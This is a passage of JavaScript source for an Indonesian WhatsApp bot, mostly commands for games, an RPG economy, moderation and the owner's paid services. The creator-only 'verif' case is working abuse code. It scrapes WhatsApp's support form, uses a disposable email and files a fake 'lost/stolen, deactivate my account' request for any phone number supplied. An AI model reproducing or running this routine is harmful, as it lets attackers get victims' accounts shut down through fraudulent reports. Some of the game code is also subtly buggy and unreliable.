haikal.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'ping': case 'pong': case 'peng': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

🌷 RESPONS  ${latensi.toFixed(4)}
🌷 AKTIF Selama : ${runtime(process.uptime())}
🌷 RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`
haikal.sendMessage(m.chat, { image: ppnyauser, caption: respon }, { quoted:m })
}
break

//=================================================//
case 'antilink': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'ban': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!args[0]) return reply(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*User has been banned*')
banned.push(orgnye)
reply(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return reply('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Success Removing Banned Users*`)
} else {
reply("Error")
}
}
break
//=================================================//
case 'user': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!args[0]) return m.reply(`*Example* : #user add 628xxxx`)
if (args[1]) {
orgnye = args[1]
} else if (m.quoted) {
orgnye = m.quoted.sender.split("@")[0]
}
const isCwner = owner.includes(orgnye)
if (args[0] === "add") {
if (isCwner) return m.reply('User sudah menjadi owner')
owner.push(orgnye)
m.reply(`Selamat Anda Telah Bergabung`)
} else if (args[0] === "del") {
if (!isCwner) return m.reply('User bukan owner')
let delcwner = owner.indexOf(orgnye)
owner.splice(delcwner, 1)
m.reply(`Maaf Anda Telah Hapus`)
} else {
m.reply("Error")
}
}
break
//=================================================//
case 'tebak': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
if (args[0] === "lagu") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await haikal.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: hw })
haikal.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'lontong') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
}
break
//═══════════[ Rpg Menu ]═══════════\\

 //cr thunder
case 'inventori': case 'inventory': case 'profile':{
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
if (!isInventory){ addInventori(m.sender) }
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }

let teksehmazeh = `_[ INFO USER ]_\n\n`
teksehmazeh += `*❤ ️•Darah kamu:* ${getDarah(m.sender)}\n`
teksehmazeh += `*◻️️ •Besi kamu:* ${getBesi(m.sender)}\n`
teksehmazeh += `*🌟 •Emas Kamu:* ${getEmas(m.sender)}\n`
teksehmazeh += `*❇️ •Emerald Kamu:* ${getEmerald(m.sender)}\n`
teksehmazeh += `*⏺ •️Limit kamu:* ${getLimit(m.sender)}\n`
teksehmazeh += `*🧪 •Potion Kamu:* ${getPotion(m.sender)}\n\n`
teksehmazeh += `_[ HASIL BURUAN ]_\n\n`
teksehmazeh += `*🐟 •Ikan:* ${getIkan(m.sender)}\n`
teksehmazeh += `*🐔 •Ayam:* ${getAyam(m.sender)}\n`
teksehmazeh += `*🐇 •Kelinci:* ${getKelinci(m.sender)}\n`
teksehmazeh += `*🐑 •Domba:* ${getDomba(m.sender)}\n`
teksehmazeh += `*🐄 •Sapi:* ${getSapi(m.sender)}\n`
teksehmazeh += `*🐘 •Gajah:* ${getGajah(m.sender)}\n\n`
reply(teksehmazeh)
}
break
 case 'leaderboard': { 
 if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
let txt = `「 *LEADERBOARD* 」\n\n`
for (let i of _buruan){
txt += `➸ *ID :* ${i.id}\n`
txt += `*🐟 Ikan* : ${i.ikan}\n`
txt += `*🐔 Ayam* : ${i.ayam}\n`
txt += `*🐇 Kelinci* : ${i.kelinci}\n`
txt += `*🐑 Domba* : ${i.domba}\n`
txt += `*🐄 Sapi* : ${i.sapi}\n`
txt += `*🐘 Gajah* : ${i.gajah}\n\n`
}
 reply(txt)
}
 break
case 'mining': case 'mine':{
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!isInventory){ addInventori(m.sender) }
if (isCekDarah < 1) return reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Menambang Lagi ⛏️'
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: './baseikal/gambarnye/tambang.jpg' },
 caption: caption,
 footer: pushname,
 buttons: buttons,
 headerType: 4
}
haikal.sendMessage(from, buttonMessage, { quoted: m })

}, 7000)
setTimeout( () => {
reply(`${pushname} Mulai Menambang⛏️`)
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sended, emasnya)
addEmerald(m.sender, emeraldnya)
}
break
//transaksi
 case 'beli': case 'buy':{
 if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`) 
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return reply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
 var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Potion Mu:* ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Bait Food Mu:* ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Your Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { reply("Incorrect Format!") }
 }
 break
 
 case 'sell': case 'jual':{
 if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return reply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return reply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ikan Mu:* ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return reply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ayam Mu:* ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return reply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return reply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Domba Mu:* ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return reply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Sapi Mu:* ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return reply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu:* ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return reply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Besi Mu:* ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return reply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emas Mu:* ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return reply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m.sender)}`)
}, 2000) 
 } else { reply("Incorrect Format!") }
 }
 break
 case 'heal':{
 if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!isCekDarah < 1) return reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
 if (isCekDarah > 100) return reply('Darahmu Masih Full')
 if (isPotion < 1) return reply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 reply('Success! Darahmu Full Kembali')
 }
 break 
 case 'hunt': case 'hunting': case'berburu':{
 if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`) 
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return reply('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan') {
 var image = './baseikal/gambarnye/rimba.jpg'
} else
 if (lokasinya === 'Hutan Amazon') {
 var image ='./baseikal/gambarnye/amazon.jpg'
} else
 if (lokasinya === 'Hutan Tropis') {
 var image = './baseikal/gambarnye/tropis.jpg'
} else
 if (lokasinya === 'Padang Rumput') {
 var image = './baseikal/gambarnye/padang_rumput.jpg'
} else
 if (lokasinya === 'Hutan Afrika') {
 var image = './baseikal/gambarnye/afrika.jpg'
} else
 if (lokasinya === 'Pegunungan') {
var image = './baseikal/gambarnye/pegunungan.jpg'
}
 setTimeout( () => {
let teksehmazeh = `_[ Hasil Berburu ]_\n`
teksehmazeh += `*🐟 Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔 Ayam* : ${ayam}\n`
teksehmazeh += `*🐇 Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑 Domba* : ${domba}\n`
teksehmazeh += `*🐄 Sapi* : ${sapi}\n`
teksehmazeh += `*🐘 Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${getDarah(m.sender)}\n`
 let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Berburu Lagi ️🏹'
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: image },
 caption: teksehmazeh,
 footer: pushname,
 buttons: buttons,
 headerType: 4
}
haikal.sendMessage(from, buttonMessage, { quoted: m }) 
}, 5000)
 setTimeout( () => {
reply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
// # BATAS # \\
//=================================================//
case 'owner': case 'crator': case 'listowner':{
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendContact(m.chat, global.owner, m)
}
break
//=================================================//
case 'menu': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: ppnyauser, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
${menu}` }, { quoted:m })
}
break
case 'bugmenu': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: ppnyauser, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
${bugmenu}` }, { quoted:m })
}
break
case 'allmenu': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: ppnyauser, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
${allmenu}` }, { quoted:m })
}
break
case 'textmaker': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: ppnyauser, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
${textmaker}` }, { quoted:m })
}
break
case 'rpgmenu': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: ppnyauser, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
${rpgmenu}` }, { quoted:m })
}
break
//=================================================/
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
haikal.sendImage(m.chat, data.url, mess.success, m)
})
break
case 'jadian': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, {mentions: menst})
}
break

//=================================================//
case prefix+"verif": {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
haikal.sendMessage(m.chat, { text: util.format(res.data)}, { quoted:m })
}
break
//=================================================//
case 'sewa': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Halo Kak Kamu Bisa Hubungi Owner Ku Xwby
Wa.me/6285608484711`)
}
break
//=================================================//
case 'skrip': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Halo Kak Kamu Bisa Hubungi Owner Ku Gilzzxy 
Wa.me/6285608484711`)
}
break
//=================================================//
case 'listjualan': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
.whatsapp
.skrip
.panel
.diamond
.pulsa
.payment
.nodemodules
.tutorial`)
}
break
//=================================================//
case 'whatsapp': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Untuk Harga Custom WhatsApp 50k Boleh Request Fitur Tampilam Nama Dan Logo Yah Hub: Wa.me/6285608484711`)
}
break
//=================================================//
case 'nodemodules': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Halo Kak Kamu Bisa Hubungi Owner Ku Gilzzxy
Wa.me/6285608484711`)
}
break

//=================================================//
case 'panel': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
[ *List Harga Panel* ]

[ *List Harga Panel* ]

